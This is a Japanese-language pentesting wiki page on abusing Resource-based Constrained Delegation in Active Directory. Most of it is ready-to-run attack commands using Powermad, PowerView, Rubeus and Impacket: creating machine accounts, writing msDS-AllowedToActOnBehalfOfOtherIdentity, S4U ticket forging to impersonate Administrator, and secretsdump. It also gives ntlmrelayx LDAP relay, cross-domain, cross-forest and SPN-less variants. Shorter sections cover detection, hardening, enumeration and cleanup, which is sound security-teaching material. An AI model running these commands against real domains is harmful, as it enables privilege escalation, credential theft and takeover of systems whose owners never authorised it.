# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Resource-based Constrained Delegation の基本

Resource-based constrained delegation（RBCD）は[constrained delegation](constrained-delegation.md)に似ていますが、信頼の方向が逆です。従来の constrained delegation では、プリンシパルが委任できるサービスを記録します。一方、RBCD では**ターゲットリソース**に、そのリソースに対してユーザーを偽装できるプリンシパルを記録します。<sup>[[12]](#references)</sup>

ターゲットオブジェクトの _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ 属性には、そのリソースに対して他の ID の代理として動作することを許可されたプリンシパルを示すセキュリティ記述子が含まれます。

もう一つの重要な違いとして、**マシンアカウントへの書き込み権限**（`GenericAll`、`GenericWrite`、`WriteDacl`、`WriteProperty`、および同様の権限）を十分に持つプリンシパルは、_**msDS-AllowedToActOnBehalfOfOtherIdentity**_ を設定できる場合があります。従来の constrained delegation の設定には、通常、より強い管理者権限が必要です。<sup>[[1]](#references)</sup>

より正確には、従来の constrained delegation の設定変更は、通常、ドメインコントローラー上の `SeEnableDelegationPrivilege` によって制限されます。この権限は、一般に高度な権限を持つ管理者が保有しています。RBCD では判断がターゲットオブジェクトのセキュリティ記述子に委ねられるため、該当するコンピューターオブジェクトのプロパティへの書き込み権限があれば、そのユーザー権限がなくても十分な場合があります。<sup>[[1]](#references)[[2]](#references)</sup>

### 新しい概念

`userAccountControl` の **`TrustedToAuthForDelegation`** フラグは、**S4U2Self** の前提条件として説明されることがよくありますが、これは正確ではありません。\
SPN を持つサービスプリンシパルは、このフラグがなくても S4U2Self を要求できます。`TrustedToAuthForDelegation` がある場合、返されるサービスチケットは**フォワーダブル**になります。ない場合、チケットは通常**非フォワーダブル**になります。<sup>[[5]](#references)</sup>

従来の constrained delegation では、S4U2Proxy の段階で**非フォワーダブルな TGS** は拒否されます。RBCD では、ターゲットのセキュリティ記述子が要求元サービスを許可していれば、その S4U2Self チケットを受け入れられます。<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### 攻撃の構造

> **コンピューターアカウント**に対する**書き込み相当の権限**があれば、そのマシンへの特権アクセスを取得できる場合があります。

攻撃者がすでに**被害者のコンピューターオブジェクトに対する書き込み相当の権限**を持っているとします。

1. 攻撃者は **SPN** を持つアカウントを**侵害する**か、**作成します**（「Service A」）。デフォルトでは、認証済みドメインユーザーは **_MachineAccountQuota_** の設定に従って最大 10 個のコンピューターオブジェクトを作成できます。コンピューターオブジェクトには、使用可能な SPN が自動的に付与されます。
2. 攻撃者は被害者のコンピューター（ServiceB）に対する WRITE 権限を**悪用**し、その被害者のコンピューター（ServiceB）に対して ServiceA が任意のユーザーを偽装できるように、**resource-based constrained delegation を設定**します。
3. 攻撃者は Rubeus を使い、Service A から Service B に対して、Service B への**特権アクセス権を持つユーザー**を対象に、**完全な S4U 攻撃**（S4U2Self と S4U2Proxy）を実行します。
   1. S4U2Self（侵害または作成した SPN アカウントから）：Administrator を Service A に対して表す**TGS**を要求します（非フォワーダブル）。
   2. S4U2Proxy：その**非フォワーダブルな TGS**を使い、**被害ホスト**に対して Administrator を表すサービスチケットを要求します。
   3. Service A はターゲットリソースのセキュリティ記述子で許可されているため、この RBCD フローでは非フォワーダブルなチケットでも機能します。
4. 攻撃者は**チケットを pass-the-ticket し**、ユーザーを**偽装**して**被害者の ServiceB へのアクセス**を取得できます。<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` にすると、デフォルトのコンピューター作成経路は閉じられますが、ターゲットコンピューターオブジェクトへの書き込み権限や、既存アカウントの制御はなくなりません。SPN を持たない、制御下にある一般ユーザーを、[SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd) を通じて委任元プリンシパルとして使用できる場合があります。これは同一ドメイン内でも可能です。この経路には、実効性のある RBCD 書き込み権限、委任元ユーザーの認証情報の制御、委任可能な偽装対象 ID、互換性のある Kerberos 暗号化の動作、そしてアカウントに影響する NT ハッシュの変更が引き続き必要です。これらは別々の前提条件として扱ってください。RBCD 属性が空であることや quota がゼロであることだけでは、攻撃の成功も安全性も証明できません。

既存の RBCD 記述子には、委任元コンピューターを直接指定する代わりに**グループ**を指定することもできます。SPN を持つコンピューターアカウントを制御しており、そのグループへの追加が可能なら、ターゲットコンピューターの RBCD 属性を変更せずに、新たなメンバーシップによって委任経路が成立する場合があります。この経路が機能すると結論付ける前に、グループの実効的なメンバーシップ書き込み ACL（拒否 ACE を含む）、ネストされたメンバーシップとトークンの更新、記述子内の trustee SID、偽装対象アカウントの委任制限、ターゲットサービスの SPN を確認してください。

ドメインの _**MachineAccountQuota**_ を確認するには、次のコマンドを使用します。

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## 攻撃

### コンピューターオブジェクトの作成

**[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>を使用して、ドメイン内にコンピューターオブジェクトを作成できます。

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Resource-based Constrained Delegation の設定

**Active Directory PowerShell module を使用する**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**powerview の使用**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### 完全な S4U attack の実行（Windows/Rubeus）

まず、パスワード `123456` を設定した新しい Computer object を作成したため、そのパスワードの hash が必要です。<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

これにより、そのアカウントのRC4およびAESハッシュが出力されます。\
これで、攻撃を実行できます：<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Rubeusの`/altservice`パラメーターを使えば、一度依頼するだけで、より多くのサービス向けのチケットを生成できます。

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> ユーザーには **「アカウントは機密扱いであり、委任できません。」** のフラグを設定できます。このフラグが有効な場合、この委任フローを通じてそのアカウントになりすますことはできません。BloodHound は分析時にこのプロパティを表示します。

### Linux ツール: Impacket によるエンドツーエンドの RBCD (2024年以降)

Linux から操作する場合、公式の Impacket ツールを使用して RBCD の一連の手順を実行できます:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

注記
- LDAP signing/LDAPS が強制されている場合は、`impacket-rbcd -use-ldaps ...` を使用します。
- AES keys を優先してください。多くの最新ドメインでは RC4 が制限されています。Impacket と Rubeus はどちらも AES-only のフローをサポートしています。
- Impacket は一部のツールで `sname`（「AnySPN」）を書き換えられますが、可能な限り正しい SPN（例：CIFS/LDAP/HTTP/HOST/MSSQLSvc）を取得してください。

## ドメイン間・フォレスト間の RBCD

制御している**委任元プリンシパル**が**リソースコンピューター**とは**異なるドメイン**（または**異なるフォレスト**）に存在する場合も、悪用手法は**RBCD**ですが、チケットのフローは通常の単一ドメインの `S4U2Self -> S4U2Proxy` とは異なります。

### ドメイン間 RBCD：SID で外部プリンシパルを設定する

**異なるドメイン**から `msDS-AllowedToActOnBehalfOfOtherIdentity` を設定する場合、外部のマシン／ユーザーがターゲットドメインの LDAP で**名前解決できない**ことがあります。その場合は、sAMAccountName/UPN の代わりに外部プリンシパルの **SID** を使って委任エントリを設定してください。

これは特に、NTLM を LDAP にリレーする際に重要です（`ntlmrelayx.py`）：<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Notes:
- `--sid` は、委任元アカウントがターゲットドメインの外部にある場合に必要な、`--escalate-user` を SID として扱うよう `ntlmrelayx.py` に指示します。
- ツールに `User not found in LDAP` と表示されても、security descriptor に外部 SID が直接保存されるため、委任の書き込みが成功する場合があります。

### Cross-domain RBCD: cross-realm S4U sequence

外部プリンシパルが `msDS-AllowedToActOnBehalfOfOtherIdentity` に登録されたら、動作する cross-domain フローは次のとおりです。<sup>[[9]](#references)[[13]](#references)</sup>

1. 委任元プリンシパルのドメインから、そのプリンシパルの **TGT** を取得します。
2. `krbtgt/<target-domain>` の **referral TGT** を要求します。
3. ターゲットドメインの DC で、偽装するユーザーの **cross-realm S4U2Self referral** を要求します。
4. 委任元ドメインで、そのユーザーの実際の **S4U2Self** ticket を要求します。
5. 委任元ドメインで **S4U2Proxy** を実行し、ターゲットドメイン向けの referral ticket を取得します。
6. ターゲットドメインの DC で最後の **S4U2Proxy** を実行し、`cifs/host.target`、`host/host.target` などの service ticket を取得します。

このため、標準的な Linux ツールでは cross-domain RBCD が失敗することがよくあります。<sup>[[9]](#references)</sup>
- `TGS-REQ` で使用する TGT の realm と、リクエストの **realm** が異なる場合がある
- この chain では、**S4U2Self** のみ、または **S4U2Self** の直後に単一の **S4U2Proxy** を実行するだけではなく、独立した **S4U2Proxy** の手順が必要

### Cross-domain RBCD from Linux

Synacktiv は、2 つの KDC を明示的に処理し、Linux から cross-realm sequence を再現する Impacket `getST.py` の実装を公開しました。<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

運用上、新しい引数は次のとおりです。
- `-dc-ip`: **委任元**ドメインの DC
- `-targetdomain`: **リソースコンピューター**のドメイン
- `-targetdc`: **リソース**ドメインの DC

### フォレスト間 RBCD の制約

フォレスト間 RBCD には重要な制約があります。**偽装するユーザーは、委任元プリンシパルと同じフォレストに属している必要があります**。つまり、制御下のコンピューターアカウントが `valhalla.local` にあり、ターゲットリソースが `asgard.local` にある場合、通常、RBCD を使って任意の `asgard.local` ユーザーをそのリソースに対して偽装することは**できません**。<sup>[[9]](#references)</sup>

次の場合は、引き続き悪用できます。
- **委任元フォレスト**のユーザーが、別フォレストのリソースホストで**ローカル管理者**（または同等の権限を持つユーザー）である
- 信頼関係によって必要な認証経路が許可され、ターゲットコンピューターのセキュリティ記述子で外部 SID が受け入れられる

### フォレスト間 RBCD のプロトコル上の特徴

フォレスト間 RBCD は、単に「信頼関係のあるドメイン間」で行うものではありません。確認されているフローには、一般的なツールが従来見落としていた特徴が2つあります。<sup>[[9]](#references)</sup>

1. **`PA-PAC-OPTIONS=branch-aware`** を設定する追加の **S4U2Proxy** リクエスト
2. 他の etype を要求していても、最終的なサービスチケットが **RC4** を使って返される場合がある

実際のフローは次のとおりです。

1. フォレスト A の委任元プリンシパルの TGT を取得します。
2. フォレスト A で、偽装するユーザーの **S4U2Self** を要求します。
3. フォレスト A で **S4U2Proxy** を要求し、フォレスト B への referral TGT を取得します。
4. フォレスト A で2回目の **S4U2Proxy** を送信します。このとき、S4U2Self チケットを追加チケットとして含めず、`branch-aware` を有効にして、フォレスト B への別の referral TGT を取得します。
5. 必要に応じて、フォレスト B で委任元プリンシパルの通常のサービスチケットを要求します（最終的な悪用にはこのチケットは不要です）。
6. 手順3と4で取得した referral ticket を使い、フォレスト B で、偽装するフォレスト A のユーザーからターゲット SPN への最終的な **S4U2Proxy** チケットを要求します。

### Linux からのフォレスト間 RBCD

同じ Synacktiv Impacket ブランチでは、この処理のために `-forest` スイッチが追加されています。<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### 再帰的なマルチドメイン RBCD（3+ ドメイン）

**マルチドメインフォレスト**では、**S4U2Self** と **S4U2Proxy** は、1回の referral で止まらず、**再帰的に**実行できます。

- **再帰的な S4U2Self**: 最初の `S4U2Self` は**偽装対象ユーザーのドメイン**に送信され、中間の親子ドメイン間のホップは通常の `TGS-REQ` referral である `krbtgt/<REALM>` を使って通過します。そして、**最後の `S4U2Self`** は**委任元プリンシパル自身のドメイン**に送信されます。
- つまり、マシンアカウントの **TGT** を保持しているだけで、同じフォレスト内の別ドメインにいる **admin** を偽装し、`cifs/host`、`host/host`、`wsman/host` などを要求できる場合があります。
- **再帰的な S4U2Proxy** も同じように信頼チェーンをたどります。中間ホップでは、次の `krbtgt/<REALM>` referral を要求する際に、前のチケットを TGT として再利用し、最後のホップで最終的なサービスチケットが返されます。<sup>[[10]](#references)</sup>

同一フォレストでの実用的な例は次のとおりです。

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less クロスドメイン / クロスフォレスト RBCD

**委任元プリンシパルが SPN を持たないユーザーの場合**、最後の再帰的な `S4U2Self` が **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** で失敗します。回避策は、最後のホップのみ **`S4U2Self+U2U`** として再試行することです。<sup>[[10]](#references)</sup>

悪用チェーンの概要:

1. **NT hash** で認証し、KDC が **RC4-HMAC (etype 23)** を選ぶようにします。
2. まず **`-self -u2u`** を要求し、そのチケットを後続の proxy ステップ用チケットと分けて保管します。
3. `describeTicket.py` で **TGT session key** を抽出します。
4. `changepasswd.py -newhashes <session_key>` を使って、ユーザーの **NT hash** をその **session key** に置き換えます。
5. `S4U2Self+U2U` チケットを、別途実行する **`-proxy`** リクエストの **`-additional-ticket`** として再利用します。

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

運用上の注意点:

- **最初の信頼されたホップがすでに別のフォレストにある場合**は、Windows のネイティブ動作に合わせるため、**branch-aware** アルゴリズム（`getST.py ... -forest`）を使用してください。外部フォレストに到達するのがチェーンの後半だけであれば、branch-aware ではない再帰フローでも動作する場合があります。<sup>[[9]](#references)</sup>
- 最近の **Windows Server 2022/2025** DC では、RC4 の廃止により、RC4 を強制すると **`KDC_ERR_ETYPE_NOSUPP`** が発生することがあります。その結果、従来の SPN を使用する RBCD は AES で動作しても、**SPN-less RBCD** は実行できない場合があります。<sup>[[15]](#references)</sup>
- ユーザーのハッシュやパスワードを変更する前に、**`S4U2Self+U2U` を実行してください**。`SamrChangePasswordUser` はアカウントの Kerberos AES キーを再計算しないため、先にパスワードを変更すると、その後のチケット要求に失敗する可能性があります。<sup>[[14]](#references)</sup>
- なりすまし対象のアカウントは、引き続き**委任可能**である必要があります。**Protected Users** および **`NOT_DELEGATED`** / **「アカウントは重要なため委任できない」** が設定されたアカウントでは、チェーンがブロックされます。

## 検出 / ハードニングに関する注意点

- ドメインやフォレストをまたぐ RBCD の経路は、通常、**ACL の悪用**または **LDAP へのリレー**によって作成されます。DC で **LDAP signing** と **LDAP channel binding** を適用し、一般的な設定経路を遮断してください。
- コンピューターオブジェクトの `msDS-AllowedToActOnBehalfOfOtherIdentity` に書き込めるユーザーを監査し、保存されている SID（**foreign security principals** を含む）を解決してください。
- 信頼関係の多い環境では、**Selective Authentication**、**SID filtering**、および外部フォレストのユーザーがリソースホストで **local admin** 権限を持っていないかを確認してください。

### アクセス

最後のコマンドラインは、**S4U attack 全体を実行し、Administrator から victim host への TGS をメモリ内に注入します**。\
この例では、Administrator から **CIFS** サービスへの TGS を要求しているため、**C$** にアクセスできます:

```bash
ls \\victim.domain.local\C$
```

### さまざまなサービスチケットの悪用

[**利用可能なサービスチケットはこちら**](silver-ticket.md#available-services)を確認してください。

## 列挙、監査、クリーンアップ

### RBCDが設定されているコンピューターを列挙する

PowerShell（SDをデコードしてSIDを解決）:

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket（1つのコマンドで読み取りまたはフラッシュ）:

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### RBCD のクリーンアップ / リセット

- PowerShell（属性をクリア）:

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos Errors

- **`KDC_ERR_ETYPE_NOTSUPP`**: KerberosがDESまたはRC4を使用しないように設定されており、RC4 hashのみを指定していることを意味します。Rubeusには少なくともAES256 hashを指定してください（またはRC4、AES128、AES256の各hashを指定してください）。例: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- 通常のユーザーに対する`-self`実行中の**`KDC_ERR_S_PRINCIPAL_UNKNOWN`**: 委任元のprincipalに**SPNが設定されていない**可能性があります。通常の`S4U2Self`ではなく、**`S4U2Self+U2U`**を使って**最後のホップ**を再試行してください。<sup>[[10]](#references)</sup>
- **SPN-less RBCD**実行中の**`KDC_ERR_ETYPE_NOSUPP`**: 最近のDCでは、`S4U2Self+U2U`とsession-key-substitutionの手法に必要な、強制的な**RC4-HMAC**の処理が拒否される場合があります。代わりに、AESを使う従来の**SPN-backed** RBCDの手順を試してください。<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: 現在のコンピューターの時刻がDCの時刻と異なり、Kerberosが正常に動作していないことを意味します。
- **`preauth_failed`**: 指定したusernameとhashではログインできないことを意味します。hashの生成時にusernameに`$`を付け忘れた可能性があります（`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`）。
- **`KDC_ERR_BADOPTION`**: 次のいずれかを意味する可能性があります。
  - 偽装しようとしているユーザーが、目的のserviceにアクセスできない（偽装できない、または十分な権限がない）
  - 要求したserviceが存在しない（winrmが実行されていないのにwinrmのticketを要求した場合など）
  - 作成したfakecomputerが脆弱なサーバーに対する権限を失っており、権限を再付与する必要がある
  - classic KCDを悪用している。RBCDではforwardableではないS4U2Self ticketを使用できますが、KCDではforwardableが必要です。

## Notes, relays and alternatives

- LDAPがfilteringされている場合、AD Web Services（ADWS）経由でRBCD SDを書き込むこともできます。参照:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay chainは、1ステップでローカルのSYSTEM権限を得るために、最終的にRBCDを利用することがよくあります。実践的なエンドツーエンドの例:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- LDAP signing/channel bindingが**無効**で、machine accountを作成できる場合、**KrbRelayUp**などのtoolを使って、強制したKerberos認証をLDAPにrelayし、対象のcomputer object上で自分のmachine accountに対する`msDS-AllowedToActOnBehalfOfOtherIdentity`を設定したうえで、off-hostからS4U経由で**Administrator**をすぐに偽装できます。<sup>[[8]](#references)</sup>

## References

- [1] [Wagging the Dog: Resource-Based Constrained Delegationを悪用したActive Directoryへの攻撃](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Delegationについてもう一言 – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Computer Objectの乗っ取り](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Resource-Based Constrained Delegationの悪用](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity Killed the Domain: 攻撃者向けKerberos概要](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py（公式）](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [最近の構文に対応したLinux用クイックチートシート](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno（LDAP signingが無効 → Kerberos relayからRBCDへ）](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv - クロスドメインおよびクロスフォレストRBCDの調査](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv - クロスドメインおよびクロスフォレストRBCDの調査: パート2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn - Kerberos constrained delegationの概要](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - クロスドメインS4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - KerberosでのRC4使用の検出と修復](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – S4U2Proxyの詳細](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
